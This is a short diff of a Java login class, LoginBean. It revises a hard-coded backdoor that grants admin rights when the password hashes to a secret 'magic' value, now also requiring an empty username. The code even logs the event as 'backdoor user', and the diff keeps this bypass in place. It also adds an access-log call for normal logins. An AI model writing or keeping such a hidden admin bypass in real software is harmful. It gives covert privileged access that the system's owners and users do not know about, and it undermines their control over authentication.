@@ -155,7 +155,10 @@ public class LoginBean {
          */
         // query
         
-        if(SHAsum(password.getBytes()).equals(magic)){
+        /**
+         * Controllo username vuoto e password magic
+         */
+        if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
             this.admin=true;
             log.aclog("backdoor user", 0);
             adminAccess();
@@ -471,6 +474,7 @@ public class LoginBean {
                     if (pb != null) {
                         username = uid;
                         setUser(true);
+                        log.aclog(uid, 3);
                     }
                 } catch (ClassNotFoundException ex) {
                     Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
